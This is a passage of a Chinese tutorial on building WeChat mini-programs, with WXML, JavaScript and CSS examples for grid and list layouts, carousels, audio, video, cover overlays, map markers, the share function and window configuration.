class="attr">class</span>=<span class="string">&quot;weui-grid__label&quot;</span>&gt;</span>&#123;&#123;grid.title&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;block&gt;</code>的标签，这个标签主要是说明里面包含的是一个多节点的结构块，换成<code>&lt;view&gt;</code>组件也没有太大影响</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">grids</span>:[</span><br><span class="line">      &#123; <span class="attr">imgurl</span>:<span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon1.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>:<span class="string">&quot;招聘&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon2.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;房产&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon3.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;二手车新车&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon4.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;二手&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon5.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;招商加盟&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon6.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;兼职&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon7.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;本地&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon8.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;家政&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon9.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;金币夺宝&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon10.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;送现金&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><p>一行五列式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.weui-grid</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">20%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x007-List样式参考-适用于个人中心"><a href="#0x007-List样式参考-适用于个人中心" class="headerlink" title="0x007 List样式参考(适用于个人中心)"></a>0x007 List样式参考(适用于个人中心)</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-cells weui-cells_after-title&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;listicons&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;listicons&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">url</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;weui-cell weui-cell_access&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;weui-cell_active&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-cell__hd&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;listicons.icon&#125;&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin-right: 5px;vertical-align: middle;width:20px; height: 20px;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-cell__bd&quot;</span>&gt;</span>&#123;&#123;listicons.title&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-cell__ft weui-cell__ft_in-access&quot;</span>&gt;</span>&#123;&#123;listicons.desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">listicons</span>:[&#123;</span><br><span class="line">      <span class="attr">icon</span>:<span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/listicons1.png&quot;</span>,</span><br><span class="line">      <span class="attr">title</span>:<span class="string">&quot;我的文件&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">icon</span>:<span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/listicons2.png&quot;</span>,</span><br><span class="line">      <span class="attr">title</span>:<span class="string">&quot;我的收藏&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>:<span class="string">&quot;收藏列表&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">icon</span>:<span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/listicons3.png&quot;</span>,</span><br><span class="line">      <span class="attr">title</span>:<span class="string">&quot;我的邮件&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    ],</span><br></pre></td></tr></table></figure><h2 id="0x07-小程序组件"><a href="#0x07-小程序组件" class="headerlink" title="0x07 小程序组件"></a>0x07 小程序组件</h2><h3 id="0x001-轮播效果"><a href="#0x001-轮播效果" class="headerlink" title="0x001 轮播效果"></a>0x001 轮播效果</h3><p>需要用到的轮播组件swiper</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;home-top&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;home-swiper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">swiper</span> <span class="attr">indicator-dots</span>=<span class="string">&quot;&#123;&#123;indicatorDots&#125;&#125;&quot;</span> <span class="attr">autoplay</span>=<span class="string">&quot;&#123;&#123;autoplay&#125;&#125;&quot;</span> <span class="attr">interval</span>=<span class="string">&quot;&#123;&#123;interval&#125;&#125;&quot;</span> <span class="attr">duration</span>=<span class="string">&quot;&#123;&#123;duration&#125;&#125;&quot;</span> <span class="attr">indicator-color</span>=<span class="string">&quot;&#123;&#123;indicatorColor&#125;&#125;&quot;</span> <span class="attr">indicator-active-color</span>=<span class="string">&quot;&#123;&#123;activecolor&#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;imgUrls&#125;&#125;&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*this&quot;</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">swiper-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;item&#125;&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;height:200px&quot;</span> <span class="attr">class</span>=<span class="string">&quot;slide-image&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span>  /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">swiper-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">swiper</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">imgUrls</span>: [</span><br><span class="line">  <span class="string">&#x27;https://images.unsplash.com/photo-1551334787-21e6bd3ab135?w=640&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;https://images.unsplash.com/photo-1551214012-84f95e060dee?w=640&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;https://images.unsplash.com/photo-1551446591-142875a901a1?w=640&#x27;</span></span><br><span class="line">],</span><br><span class="line"><span class="attr">interval</span>: <span class="number">5000</span>,</span><br><span class="line"><span class="attr">duration</span>: <span class="number">1000</span>,</span><br><span class="line"><span class="attr">indicatorDots</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">indicatorColor</span>: <span class="string">&quot;#ffffff&quot;</span>,</span><br><span class="line"><span class="attr">activecolor</span>:<span class="string">&quot;#2971f6&quot;</span>,</span><br><span class="line"><span class="attr">autoplay</span>: <span class="literal">true</span>,</span><br></pre></td></tr></table></figure><p>要构成一个完整的轮播需要满足：</p><p>1.配置<strong>相同尺寸规格的图片</strong></p><p>2.配置轮播时的面板指示点、动画效果、是否自动播放等</p><h3 id="0x002-audio组件-音乐列表"><a href="#0x002-audio组件-音乐列表" class="headerlink" title="0x002 audio组件(音乐列表)"></a>0x002 audio组件(音乐列表)</h3><p>audio组件是音频组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;musicinfo.src&#125;&#125;&quot;</span> <span class="attr">poster</span>=<span class="string">&quot;&#123;&#123;musicinfo.poster&#125;&#125;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&#123;&#123;musicinfo.name&#125;&#125;&quot;</span> <span class="attr">author</span>=<span class="string">&quot;&#123;&#123;musicinfo.author&#125;&#125;&quot;</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">musicinfo</span>: &#123;</span><br><span class="line">     <span class="attr">poster</span>: <span class="string">&#x27;http://y.gtimg.cn/music/photo_new/T002R300x300M000003rsKF44GyaSk.jpg?max_age=2592000&#x27;</span>,</span><br><span class="line">     <span class="attr">name</span>: <span class="string">&#x27;此时此刻&#x27;</span>,</span><br><span class="line">     <span class="attr">author</span>: <span class="string">&#x27;许巍&#x27;</span>,</span><br><span class="line">     <span class="attr">src</span>: <span class="string">&#x27;http://ws.stream.qqmusic.qq.com/M500001VfvsJ21xFqb.mp3?guid=ffffffff82def4af4b12b3cd9337d5e7&amp;uin=346897220&amp;vkey=6292F51E1E384E06DCBDC9AB7C49FD713D632D313AC4858BACB8DDD29067D3C601481D36E62053BF8DFEAF74C0A5CCFADD6471160CAF3E6A&amp;fromtag=46&#x27;</span>,</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>audio组件：</p><ul><li>src：要播放音频的资源地址</li><li>poster：默认控件上的音频封面的图片资源地址</li><li>name：默认控件上的音频名字</li><li>author：默认控件上的作者名字</li></ul><p>可能由于audio组件使用的场景和频次都非常低，audio组件以后就要被抛弃了，需要用到小程序的API来创建音乐播放。</p><h3 id="0x003-video组件"><a href="#0x003-video组件" class="headerlink" title="0x003 video组件"></a>0x003 video组件</h3><p>video组件用来表示视频</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">id</span>=<span class="string">&quot;daxueVideo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://wxsnsdy.tc.qq.com/105/20210/snsdyvideodownload?filekey=30280201010421301f0201690402534804102ca905ce620b1241b726bc41dcff44e00204012882540400&amp;bizid=1023&amp;hy=SH&amp;fileparam=302c020101042530230204136ffd93020457e3c4ff02024ef202031e8d7f02030f42400204045a320a0201000400&quot;</span> <span class="attr">autoplay</span> <span class="attr">loop</span> <span class="attr">muted</span> <span class="attr">initial-time</span>=<span class="string">&quot;100&quot;</span> <span class="attr">controls</span> <span class="attr">event-model</span>=<span class="string">&quot;bubble&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><p>video组件：</p><ul><li>autoplay：是否自动播放</li><li>loop：是否循环播放</li><li>muted：是否静音播放</li><li>inital-time：指定视频初始播放位置，单位是秒</li><li>controls：是否显示默认播放控件</li></ul><h3 id="0x004-cover效果"><a href="#0x004-cover效果" class="headerlink" title="0x004 cover效果"></a>0x004 cover效果</h3><p>可以把view、图片组件覆盖在地图map或视频video组件之上</p><p>适用条件情况：</p><p>希望在视频的左上角显示视频的标题以及在右上角显示商家的logo，就可以使用cover效果。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">id</span>=<span class="string">&quot;daxueVideo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://wxsnsdy.tc.qq.com/105/20210/snsdyvideodownload?filekey=30280201010421301f0201690402534804102ca905ce620b1241b726bc41dcff44e00204012882540400&amp;bizid=1023&amp;hy=SH&amp;fileparam=302c020101042530230204136ffd93020457e3c4ff02024ef202031e8d7f02030f42400204045a320a0201000400&quot;</span> <span class="attr">controls</span> <span class="attr">event-model</span>=<span class="string">&quot;bubble&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;covertext&quot;</span>&gt;</span>腾讯大学：腾讯特色学习交流平台<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;coverimg&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://imgcache.qq.com/open_proj/proj_qcloud_v2/gateway/portal/css/img/nav/logo-bg-color.svg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.covertext</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">500</span>rpx;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>:<span class="number">20</span>rpx;</span><br><span class="line">  <span class="attribute">left</span>:<span class="number">10</span>rpx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.coverimg</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">100</span>rpx;<span class="attribute">height</span>:<span class="number">23</span>rpx;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">right</span>:<span class="number">10</span>rpx;</span><br><span class="line">  <span class="attribute">top</span>:<span class="number">10</span>rpx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x005-地图组件"><a href="#0x005-地图组件" class="headerlink" title="0x005 地图组件"></a>0x005 地图组件</h3><p>要想在地图上标记一个地点，首先我们需要知道该地点的经纬度，这个时候就需要使用到坐标拾取器的工具。</p><p><strong>经纬度获取：</strong><a href="https://lbs.qq.com/tool/getpoint/index.html">腾讯地图坐标拾取器</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;myMap&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;width: 100%; height: 300px;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">latitude</span>=<span class="string">&quot;&#123;&#123;latitude&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">longitude</span>=<span class="string">&quot;&#123;&#123;longitude&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">markers</span>=<span class="string">&quot;&#123;&#123;markers&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">covers</span>=<span class="string">&quot;&#123;&#123;covers&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">show-location</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">latitude</span>: <span class="number">22.540503</span>,</span><br><span class="line"><span class="attr">longitude</span>: <span class="number">113.934528</span>,</span><br><span class="line"><span class="attr">markers</span>: [&#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">latitude</span>: <span class="number">22.540503</span>,</span><br><span class="line">  <span class="attr">longitude</span>: <span class="number">113.934528</span>,</span><br><span class="line">  <span class="attr">title</span>: <span class="string">&#x27;深圳腾讯大厦&#x27;</span></span><br><span class="line">&#125;],</span><br></pre></td></tr></table></figure><p><strong>在地图上标记多个点</strong></p><p>markers标记点用于在地图上显示标记的位置，它的<strong>数据类型</strong>是<strong>Array数组</strong></p><p>在markers里多添加几个坐标：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">markers</span>: [</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">     <span class="attr">latitude</span>: <span class="number">22.540503</span>,</span><br><span class="line">     <span class="attr">longitude</span>: <span class="number">113.934528</span>,</span><br><span class="line">     <span class="attr">title</span>: <span class="string">&#x27;深圳腾讯大厦&#x27;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">       <span class="attr">latitude</span>: <span class="number">22.540576</span>,</span><br><span class="line">       <span class="attr">longitude</span>: <span class="number">113.933790</span>,</span><br><span class="line">       <span class="attr">title</span>: <span class="string">&#x27;万利达科技大厦&#x27;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">id</span>: <span class="number">3</span>,</span><br><span class="line">       <span class="attr">latitude</span>: <span class="number">22.522807</span>,</span><br><span class="line">       <span class="attr">longitude</span>: <span class="number">113.935338</span>,</span><br><span class="line">       <span class="attr">title</span>: <span class="string">&#x27;深圳腾讯滨海大厦&#x27;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">id</span>: <span class="number">4</span>,</span><br><span class="line">       <span class="attr">latitude</span>: <span class="number">22.547400</span>,</span><br><span class="line">       <span class="attr">longitude</span>: <span class="number">113.944370</span>,</span><br><span class="line">       <span class="attr">title</span>: <span class="string">&#x27;腾讯C2&#x27;</span></span><br><span class="line">     &#125;,    </span><br><span class="line">   ],</span><br></pre></td></tr></table></figure><p>除了marker，还有以下属性:</p><ul><li>callout:点击marker出现气泡callout、以及气泡上的label，可以丰富点击地图标记弹出丰富的信息介绍；</li><li>circle：在地图上显示圆，比如用于显示方圆几公里，或者权重大小在地图的可视化</li><li>polygon：指定一系列坐标点，根据 points 坐标数据生成闭合多边形,，比如圈出实际的范围</li><li>polyline：指定一系列坐标点，从数组第一项连线至最后一项，比如跑步的路线</li></ul><h2 id="0x08-优化部署上线"><a href="#0x08-优化部署上线" class="headerlink" title="0x08 优化部署上线"></a>0x08 优化部署上线</h2><h3 id="0x001-小程序的转发功能"><a href="#0x001-小程序的转发功能" class="headerlink" title="0x001 小程序的转发功能"></a>0x001 小程序的转发功能</h3><p>只需要在小程序每个页面的js文件下的Page({ }） 里面，添加以下代码，小程序就有转发功能了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">onShareAppMessage</span>: <span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (res.<span class="property">from</span> === <span class="string">&#x27;button&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 来自页面内转发按钮</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">target</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="string">&#x27;云开发技术训练营&#x27;</span>,</span><br><span class="line">            <span class="attr">path</span>: <span class="string">&quot;pages/home/home,</span></span><br><span class="line"><span class="string">            imageUrl:&quot;</span><span class="attr">https</span>:<span class="comment">//hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/weapp.jpg&quot;,</span></span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">                <span class="comment">// 转发成功</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">fail</span>: <span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">                <span class="comment">// 转发失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><ul><li>title为转发的标题，如果不填，默认为当前小程序的名称；</li><li>path为当前页面路径，也可以为其他页面的路径，如果路径写错的话会显示“当前页面不存在”哦。</li><li>imageUrl为自定义图片路径，可以是本地文件路径或网络图片路径。支持PNG及JPG。显示图片长宽比是 5:4。如果不填写会取当前页面，从顶部开始，高度为 80% 屏幕宽度的图像作为转发图片</li></ul><h3 id="0x002-小程序配置的细节"><a href="#0x002-小程序配置的细节" class="headerlink" title="0x002 小程序配置的细节"></a>0x002 小程序配置的细节</h3><h4 id="0x0001-没有tabBar的小程序"><a href="#0x0001-没有tabBar的小程序" class="headerlink" title="0x0001 没有tabBar的小程序"></a>0x0001 没有tabBar的小程序</h4><p>删掉app.json的tabBar配置项即可。</p><h4 id="0x0002-下拉小程序不出现空白"><a href="#0x0002-下拉小程序不出现空白" class="headerlink" title="0x0002 下拉小程序不出现空白"></a>0x0002 下拉小程序不出现空白</h4><p>当下拉很多小程序的时候，都会出现一个白色的空白，很影响美观，但是如果在windows的配置项里把<strong>backgroundColor</strong>和<strong>navigationBarBackgroundColor</strong>的颜色配置成一样，下拉就不会有空白，比如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;window&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;backgroundTextStyle&quot;</span><span class="punctuation">:</span><span class="string">&quot;light&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;navigationBarBackgroundColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1772cb&quot;</span><span 